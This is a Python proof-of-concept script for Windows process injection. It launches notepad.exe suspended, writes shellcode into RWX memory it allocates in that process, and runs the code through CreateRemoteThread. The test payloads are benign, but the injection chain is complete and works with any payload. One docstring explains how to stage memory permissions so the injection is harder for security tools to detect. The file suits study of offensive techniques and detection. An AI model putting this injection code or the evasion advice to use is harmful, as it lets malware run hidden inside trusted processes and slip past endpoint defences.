"""
Proof of Concept: Process Injection via CreateRemoteThread() (notepad.exe)
- x64 process on x64 systems

Payloads shellcode:
    - simple shellcodes to test/prove functionality
    - expected GetExitCodeThread() return code detailed

Steps:
------
- Create SUSPENDED process                     -> CreateProcessW()
- Allocate memory                              -> VirtualAllocEx()
- Write payload into allocated memory          -> WriteProcessMemory()
- Confirm payload written correctly            -> ReadProcessMemory()
- Create a new thread, and execute payload     -> CreateRemoteThread()
- Resume original thread                       -> ResumeThread()


TODO:
- implement VirtualFreeEx()
- check for system architecture (for payloads)
- in VirtualAllocEx(), implement PAGE_EXECUTE_READ -> VirtualProtectEx()
- validate return code for WaitForSingleObject()
"""


import ctypes
from ctypes import wintypes
import msvcrt


kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)




# ----------------------------------
# Payloads
# ----------------------------------

# Deterministic, return 0 from RAX -> straight up RET is non-deterministic here
# GetExitcodethread() == 0
payload = b"\x48\x31\xC0\xC3"       # xor rax, rax; ret

# Infinite loop, thread will sit at 100% CPU usage for one core.
# GetExitCodeThread() == 259
'''
payload = b"\xEB\xFE"    # JMP SHORT -2
'''



# ----------------------------------
# CONSTANTS
# ----------------------------------

# for CreateProcessW() - samples
CREATE_NEW_CONSOLE  = 0x10
CREATE_NO_WINDOW    = 0x08000000
DETACHED_PROCESS    = 0x08
CREATE_SUSPENDED    = 0x04


# for SuspendThread() and ResumeThread() calls
INVALID_DWORD = 0xFFFFFFFF


# for VirtualAllocEx()
MEM_COMMIT      = 0x1000
MEM_RESERVE     = 0x2000
PAGE_READWRITE  = 0x04
PAGE_EXECUTE_READWRITE = 0x40




# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]




# ----------------------------------
# Function Prototypes
# ----------------------------------

kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL


kernel32.CreateProcessW.argtypes =[
    wintypes.LPCWSTR,                       # lpApplicationName (opt)
    wintypes.LPWSTR,                        # [i/o] lpCommandLine (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpProcessAttributes (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes (opt)
    wintypes.BOOL,                          # bInheritHandles
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.c_void_p,                        # lpEnvironment (opt)
    wintypes.LPCWSTR,                       # lpCurrentDirectory (opt)
    ctypes.POINTER(STARTUPINFOW),           # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),    # [o] lpProcessInformation
]
kernel32.CreateProcessW.restype = wintypes.BOOL


kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE,                        # hProcess
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes
    ctypes.c_size_t,                        # dwStackSize
    wintypes.LPVOID,        # lpStartAddress, ptr to thread function
    wintypes.LPVOID,        # lpParameter, arg to thread function
    wintypes.DWORD,         # dwCreationFlags, CREATE_SUSPENDED etc
    ctypes.POINTER(wintypes.DWORD), # [o] lpThreadId (opt)
]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE


kernel32.GetExitCodeThread.argtypes = [
    wintypes.HANDLE,                  # hThread
    ctypes.POINTER(wintypes.DWORD),   # [o] lpExitCode
]
kernel32.GetExitCodeThread.restype = wintypes.BOOL


kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL


kernel32.ResumeThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.ResumeThread.restype = wintypes.DWORD


kernel32.SuspendThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.SuspendThread.restype = wintypes.DWORD


kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
#kernel32.VirtualAllocEx.restype = ctypes.c_void_p


kernel32.WaitForSingleObject.argtypes = [
    wintypes.HANDLE,  # hHandle
    wintypes.DWORD,    # dwMilliseconds
]
kernel32.WaitForSingleObject.restype = wintypes.DWORD


kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL




# ----------------------------------
# Function Definitions
# ----------------------------------

def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())




def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to avoid resource leaks """

    print(f"[+] Closing Handle {handle.value} to {name}: ", end='', flush=True)

    if handle is None or handle.value == 0:
        print(f"[!] Warning: {name} is None or invalid, nothing to close")
        return

    if not kernel32.CloseHandle(handle):
        print(f"Failed! Error: {winerr()}")
    else:
        print(f"Successful")




def create_process(
    app: str=r"c:\windows\system32\notepad.exe",
    flags: int=None
) -> tuple[wintypes.HANDLE, wintypes.HANDLE, wintypes.DWORD, wintypes.DWORD]:
    
    # define arguments
    lpApplicationName = app
    lpCommandLine = None
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = False
    dwCreationFlags = flags
    lpEnvironment = None
    lpCurrentDirectory = None
    lpProcessInformation = PROCESS_INFORMATION()

    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)

    # spawn process
    try:
        if not kernel32.CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes, 
            lpThreadAttributes, 
            bInheritHandles, 
            dwCreationFlags, 
            lpEnvironment, 
            lpCurrentDirectory, 
            ctypes.byref(lpStartupInfo), 
            ctypes.byref(lpProcessInformation)
        ):
            raise winerr()
        
        print(f"\n[+] CreateProcessW() Successful:\n" + "-" *32)
        print(f"Process created in Suspended State: {lpApplicationName}")

        # return Handles/Ids to thread and process
        
        hThread = wintypes.HANDLE(lpProcessInformation.hThread)
        hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  
        dwThreadId = lpProcessInformation.dwThreadId
        dwProcessId = lpProcessInformation.dwProcessId
        
        return hThread, hProcess, dwThreadId, dwProcessId
        
    except OSError as e:
        raise OSError(f"\n[!] CreateProcessW() Failed, Application: {app}, Error: {e}")
'''
    finally:
        hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)
        if hProcess.value != 0:
            close_handle(hProcess, "Process")

        hThread = wintypes.HANDLE(lpProcessInformation.hThread)
        if hThread.value != 0:
            close_handle(hThread, "Thread")

'''




def thread_suspend_check(hThread: wintypes.HANDLE) -> None:
    """
    Check and display current suspend-count of thread
    - SuspendThread() INcrements count, and returns previous count (eg, n -> n+1, return n)
    - ResumeThread()  DEcrements count, and returns previous count (eg, n -> n-1, return n)
    - ResumeThread() will not resume thread execution, until suspend-count == 0
    """

    prev_count = kernel32.SuspendThread(hThread)
    if prev_count == 0xFFFFFFFF:
        raise OSError("SuspendThread() failed")
    
    # technically, current count == count+1, but resetting after print/call
    print(f"\n[+] Confirming state: SuspendThread():\n" + "-" *38)
    print(f"Thread in suspended state, current Suspect Count: {prev_count}")
    
    # return/reset count to before SuspendThread() call
    if kernel32.ResumeThread(hThread) == 0xFFFFFFFF:
        raise OSError("ResumeThread() Failed")




def virtual_alloc_ex(
    hProcess: wintypes.HANDLE,
    size: int
) -> wintypes.LPVOID:
    """
    Allocate memory space in suspended process
    - returns pointer to allocated memory, in remote process

    Note: regarding PAGE_EXECUTE_READWRITE for flAllocationType (4th arg), in VirtualAllocEx()
    - apparently quite noisy, easy to detect

    Less suspicious, as it is staged:
    - set PAGE_READWRITE (here)     -> VirtualAllocEx()
    - write payload                 -> WriteProcessMemory()
    - set PAGE_EXECUTE_READ         -> VirtualProtectEx() 
    - execute                       -> CreateRemoteThread()
    """
    
    lpAddress = ctypes.c_void_p(0)
    dwSize = ctypes.c_size_t(size)

    ptr = kernel32.VirtualAllocEx(
        hProcess,
        lpAddress,
        dwSize,
        MEM_COMMIT | MEM_RESERVE,  # Reserve space, AND allocate immediately
        PAGE_EXECUTE_READWRITE
    )

    if not ptr:
        raise winerr()
    
    print(f"\n[+] VirtualAllocEx() Successful:\n" + "-" *32)
    print(f"Base address of allocated memory: {hex(ptr)}")
    
    return ptr




def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: wintypes.LPVOID,
    lpBuffer: bytes
) -> None:

    """ Write payload into the allocted memory of the remote process """

    bytes_written = ctypes.c_size_t()   # number of bytes written
    nSize = len(lpBuffer)

    payload_write = kernel32.WriteProcessMemory(
        hProcess,
        lpBaseAddress,    # pointer to allocated memory in remote process
        lpBuffer,
        nSize,
        ctypes.byref(bytes_written)
    )
    
    if not payload_write:
        raise winerr()

    print(f"\n[+] WriteProcessMemory() Successful:\n" + "-" *36)
    print(f"Payload written to memory of suspended process, bytes: {bytes_written.value}") 




def confirm_payload_write(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: wintypes.LPVOID,
    payload: bytes
) -> None:

    """ Check/confirm payload written by write_payload() as intended """

    nSize = len(payload)

    lpBuffer = ctypes.create_string_buffer(nSize)
    bytes_read = ctypes.c_size_t()

    if not kernel32.ReadProcessMemory(
        hProcess,
        lpBaseAddress,
        lpBuffer,
        nSize,
        ctypes.byref(bytes_read)
    ):
        raise winerr()

    print(f"\n[+] ReadProcessMemory() Successful:\n" + "-" *35)
    print(f"Confirming payload written to allocated space:") 
    print(f"-> Bytes read: {bytes_read.value}")
    print(f"-> Payload: {lpBuffer.raw}")
    
    print(f"-> Confirm correct payload: {lpBuffer.raw == payload}")




def create_remote_thread(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: wintypes.LPVOID,
) -> wintypes.HANDLE:

    """ Create a remote thread in the remote process, at lpBaseAddress """

    lpThreadAttributes = None
    dwStackSize = 0
    lpStartAddress = lpBaseAddress
    lpParameter = None
    dwCreationFlags = 0     # thread runs immediately after creation
    lpThreadId = wintypes.DWORD()
    
    hThread_new = kernel32.CreateRemoteThread(
        hProcess,
        lpThreadAttributes,
        dwStackSize,
        lpStartAddress,
        lpParameter,
        dwCreationFlags,
        ctypes.byref(lpThreadId)
    )

    if not hThread_new:
        raise winerr()
        
    print(f"\n[+] CreateRemoteThread() Successful:\n" + "-" *36)
    print(f"-> Newly created ThreadId: {lpThreadId.value}")
        
    return wintypes.HANDLE(hThread_new)




def pause() -> None:
    """ Pause until user key press (any) """

    msg = "\n\n[!] WARNING: About to execute payload in new thread: Press any key to continue..."
    print(msg, end='', flush=True)
    msvcrt.getch()
    print()




def resume_orig_process(
    hThread: wintypes.HANDLE,
    dwThreadId: wintypes.DWORD,
    dwProcessId: wintypes.DWORD
) -> None:
    
    """ Resume execution of original process/thread """

    print(f"\n[+] Resuming original thread:\n" + "-" *29)
    print(f"-> ProcessId: {dwProcessId}")
    print(f"-> ThreadId: {dwThreadId}")
    
    kernel32.ResumeThread(hThread)




##########################################
##### Main functionality starts here #####
##########################################

# ----------------------------------
# Create Suspended Process (notepad.exe)
# ----------------------------------

# create process, return handle/Ids to thread/process
hThread, hProcess, dwThreadId, dwProcessId = create_process(flags=CREATE_SUSPENDED)

# check suspend state of thread
thread_suspend_check(hThread)


# ----------------------------------
# Allocate memory, and write payload
# ----------------------------------

# call VirtualAllocEx() to allocate memory space <- pointer to base address of memory
lpBaseAddress = virtual_alloc_ex(hProcess, len(payload))

# write payload into allocated memory
write_payload(hProcess, lpBaseAddress, payload)

# confirm payload write
confirm_payload_write(hProcess, lpBaseAddress, payload)
pause()


# ----------------------------------
# Execute injected payload, validate execution
# ----------------------------------

# calls CreateRemoteThread()
hThread_new = create_remote_thread(hProcess, lpBaseAddress)

# pause/wait timer (eg for infinite loop test)
kernel32.WaitForSingleObject(hThread_new, 5000)

# validate thread's exit code
exit_code = wintypes.DWORD()
kernel32.GetExitCodeThread(hThread_new, ctypes.byref(exit_code))

print(f"\n[!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
print(f"[+] Remote thread exit code: {exit_code.value}")
print(f"[!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")


# ----------------------------------
# Resume execution of original thread/process
# ----------------------------------
resume_orig_process(hThread, dwThreadId, dwProcessId)


# ----------------------------------
# Clean-up
# ----------------------------------
print()
close_handle(hThread_new, "Remote Payload Thread")
close_handle(hThread, "Notepad Thread")
close_handle(hProcess, "Notepad Process")
